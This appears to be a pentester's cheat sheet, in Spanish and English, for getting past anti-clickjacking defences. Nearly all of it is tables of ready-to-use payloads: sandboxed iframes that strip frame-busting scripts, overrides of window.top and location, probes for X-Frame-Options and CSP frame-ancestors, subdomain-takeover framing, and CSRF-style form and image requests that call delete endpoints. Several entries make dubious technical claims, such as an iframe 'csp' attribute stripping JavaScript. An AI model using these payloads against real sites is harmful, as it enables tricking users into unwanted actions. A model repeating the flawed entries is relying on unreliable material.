---
aliases:
  - Frame Busting Bypass
  - Sandbox Bypass
  - X-Frame-Options Bypass
tags:
  - type/cheatsheet
  - vuln/clickjacking
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Clickjacking]]'
---
# Clickjacking - Bypass de Anti-Framing

***

## JS Frame-Busting Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://target.com/x" sandbox="allow-forms allow-same-origin" style="opacity:0.0001;..."></iframe>` | Sandbox sin `allow-scripts` strips frame-buster JS | Frame-busting JS strip. |
| `<iframe src="https://target.com/x" sandbox="allow-forms" style="opacity:0.0001;..."></iframe>` | Tightest sandbox forms-only | Forms-only attack. |
| `<iframe src="https://target.com/x" sandbox="" style="opacity:0.0001;..."></iframe>` | Empty sandbox most restrictive | Most restrictive. |
| `<script>Object.defineProperty(window,'top',{get:()=>window})</script>` (en outer page) | Override `top` getter pre-load iframe | top getter spoof. |
| `<script>Object.defineProperty(window,'location',{set:()=>{}})</script>` | Override location setter swallow | location setter swallow. |
| `<script>window.onbeforeunload=()=>'stay'</script>` | Cancel navigation events | Navigation cancel. |
| `<base target="_top">` (en outer page) | Force frame target | base target trick. |
| `<iframe sandbox="allow-same-origin allow-top-navigation-by-user-activation" src="https://target.com/x"></iframe>` | Top-navigation only on user activation | Granular permission. |
| `curl -s https://target.com/admin \| grep -oE 'top != self\|frame.busting\|top\\.location'` | Detect frame-busting patterns in source | Pre-attack detect. |
| Burp Repeater → response → search "top != self" / "self.location" | Manual frame-buster identify | Manual. |
| `<iframe src="https://target.com/x" csp="script-src 'none'" style="opacity:0.0001"></iframe>` (HTML5 csp attr) | iframe-level CSP override strips JS | iframe csp attr. |
| `<iframe sandbox="allow-scripts" srcdoc='<base target=_self><iframe src=https://target.com/x></iframe>'></iframe>` | Nested srcdoc + base target | Nested sandbox. |
^cj-bypass-jsbusting

### Sandbox bypass PoC

```html
<iframe src="https://target.com/page-with-frame-busting"
        sandbox="allow-forms allow-same-origin"
        style="opacity:0.001;width:100%;height:100%"></iframe>
```

___

## Sandbox Attribute Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe sandbox src="https://target.com/x"></iframe>` | Most restrictive — no scripts/forms/plugins | Most restrictive. |
| `<iframe sandbox="allow-forms" src="https://target.com/x"></iframe>` | Forms allowed, scripts disabled | Form-based CJ. |
| `<iframe sandbox="allow-forms allow-same-origin" src="https://target.com/x"></iframe>` | Forms + SOP enforced | Form combo. |
| `<iframe sandbox="allow-top-navigation" src="https://target.com/x"></iframe>` | Frame can navigate parent | Navigation combo. |
| `<iframe sandbox="allow-pointer-lock" src="https://target.com/x"></iframe>` | Pointer-lock allowed | Pointer combo. |
| `<iframe sandbox="allow-popups" src="https://target.com/x"></iframe>` | Popups allowed | Popup combo. |
| `<iframe sandbox="allow-forms allow-same-origin allow-scripts" src="..."></iframe>` | All needed flags (frame-buster still defeated if app uses location.replace) | Edge. |
| `<iframe sandbox="allow-forms" srcdoc='<iframe src=https://target.com/x></iframe>'></iframe>` | Nested sandbox + srcdoc strip JS | Nested strip. |
| `<iframe sandbox="allow-forms allow-modals" src="https://target.com/x"></iframe>` | Modals allowed | Modal combo. |
| `<iframe sandbox="allow-forms allow-orientation-lock" src="https://target.com/x"></iframe>` | Orientation lock allowed | Orientation. |
| `<iframe allowfullscreen sandbox="allow-forms" src="..."></iframe>` | Fullscreen + restricted | FS combo. |
| `<iframe sandbox="allow-forms allow-presentation" src="..."></iframe>` | Presentation API allowed | Presentation. |
^cj-bypass-sandbox

___

## X-Frame-Options Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -I https://target.com/admin \| grep -i x-frame-options` | Check XFO header presence | Pre-attack. |
| `curl -I https://target.com/admin/x \| grep -i x-frame-options` (multiple paths) | Per-path XFO check granular | Granular. |
| `curl -I -H "User-Agent: MSIE 9.0" https://target.com/x \| grep x-frame-options` | Probe `ALLOW-FROM` legacy IE | IE-specific. |
| `for p in /admin /api/admin /admin.php /admin/index.html /admin/login; do echo "[$p]"; curl -sI "https://target.com$p" \| grep -iE 'x-frame\|frame-ancestors'; done` | Bulk path XFO probe | Bulk probe. |
| `subjack -w subs.txt -c fingerprints.json -t 100` claim subdomain → `<iframe src="https://target.com/admin/x"></iframe>` (from claimed sub) | Subdomain SAMEORIGIN bypass via takeover | SDT combo. |
| `curl -I https://target.com/admin \| grep -iE 'x-frame-options:\s*ALLOW-FROM'` | Detect deprecated ALLOW-FROM | Legacy deprecated. |
| `nuclei -t http/misconfiguration/clickjacking.yaml -l targets.txt` | Bulk XFO scan | Bulk scan. |
| `curl -I https://target.com/legacy.html \| grep x-frame-options` (legacy paths) | Legacy paths sin XFO | Legacy paths. |
| Burp Repeater → multiple paths → compare XFO presence | Manual granular probe | Workflow. |
| `<form action="https://target.com/api/delete" method="POST"><input type="submit"></form>` (forms not XFO-blocked) | Form submission XFO bypass | Form abuse. |
| `<img src="https://target.com/api/delete?confirm=yes">` (GET endpoint) | Image GET CSRF not XFO-blocked | GET CSRF. |
| `curl -I http://target.com/admin` (HTTP vs HTTPS XFO diff) | HTTP/HTTPS XFO diff | Mixed scheme. |
| `curl -I -H "Host: target.com" https://CDN_IP/admin` (CDN strip headers) | CDN strip XFO probe | CDN misconfig. |
^cj-bypass-xfo

___

## CSP frame-ancestors Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -I https://target.com/admin \| grep -i 'content-security-policy.*frame-ancestors'` | Check frame-ancestors policy | Pre-attack. |
| `curl -I https://target.com/admin \| grep -iE 'content-security-policy.*frame-ancestors:\s*\*'` | Detect wildcard `*` permissive | Misconfig. |
| `subjack -w subs.txt -c fingerprints.json -t 100` (claim sub) luego `<iframe src=https://target.com/admin>` from claimed sub | Subdomain takeover + wildcard subdomain frame-ancestors | SDT combo. |
| `<iframe src="https://target.com/admin"></iframe>` (host en allowed origin via XSS) | XSS in allowed origin → CJ from there | XSS chain. |
| `<iframe src="data:text/html,<iframe src=https://target.com/admin></iframe>"></iframe>` (if data: allowed) | data: URI nesting | data: scheme allowed. |
| `<iframe src="blob:https://target.com/x"></iframe>` (if blob: allowed) | blob: URL framing | blob: allowed. |
| `for p in /admin /admin/x /admin/y /static; do echo "[$p]"; curl -sI "https://target.com$p" \| grep frame-ancestors; done` | Per-path frame-ancestors granular check | Granular check. |
| `curl -I https://target.com/oauth/authorize \| grep frame-ancestors` (OAuth pages often less protected) | OAuth-specific frame-ancestors check | OAuth gap. |
| Burp Repeater → multiple paths → compare CSP frame-ancestors | Manual granular CSP probe | Workflow. |
| `curl -I -H "User-Agent: Mozilla/4.0" https://target.com/admin` | Legacy User-Agent — pre-CSP browser | Legacy users. |
| `curl -I https://target.com/admin \| grep -iE 'content-security-policy-report-only'` | Report-only mode bypass | Report-only enforcement none. |
| `nuclei -t http/misconfiguration/csp-misconfiguration.yaml -u https://target.com` | Nuclei CSP misconfig scan | Auto scan. |
^cj-bypass-csp

___

## Browser Quirks y Edge Cases

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -I -H "User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; ...)" https://target.com/admin \| grep x-frame-options` | IE 8/9 XFO inconsistency probe | Legacy IE. |
| Firefox DevTools → Network → check `Content-Security-Policy: frame-ancestors` | Browser-specific enforce check | Browser test. |
| Chrome `--disable-web-security --user-data-dir=/tmp/chrome-cj` | Local CJ debug Chrome | Local debug. |
| Safari Preferences → Develop → Disable Cross-Origin Restrictions | Safari WebKit local debug | Safari debug. |
| Mobile WebView test: launch Android emulator + load CJ page | Mobile WebView CJ test | Mobile test. |
| `curl -I https://target.com/admin \| grep -iE 'x-frame-options|x[-_]Frame[-_]Options'` (case variants) | Case-sensitivity XFO test | Edge case. |
| `curl -i https://target.com/admin \| grep -ciE 'content-security-policy'` (multiple CSP headers) | Multi-CSP headers intersect | Multi-CSP. |
| `curl -I https://target.com/admin \| grep -i 'content-security-policy-report-only'` | Report-only no enforcement | Report-only edge. |
| `curl -I http://target.com/admin && curl -I https://target.com/admin` (HTTP vs HTTPS XFO) | Mixed scheme XFO inconsistency | Mixed scheme. |
| `curl -I -H "Cache-Control: max-age=0" https://target.com/admin \| grep -E 'x-frame\|frame-ancestors'` | Stale CSP cached | Stale cache. |
| `curl -H "Origin: https://CDN_ORIGIN" https://target.com/admin -I` | CDN origin-aware probe | CDN edge. |
| `<iframe srcdoc='<iframe src=https://target.com/admin></iframe>'></iframe>` (srcdoc context) | srcdoc iframe context test | srcdoc context. |
| `<frame src="https://target.com/admin">` (legacy frame tag) | Legacy frame tag (most browsers ignore) | Edge legacy. |
| `<embed src="https://target.com/admin">` (embed tag XFO check) | Embed tag XFO check | Edge embed. |
| `<object data="https://target.com/admin"></object>` (object tag XFO check) | Object tag XFO check | Edge object. |
^cj-bypass-quirks

***
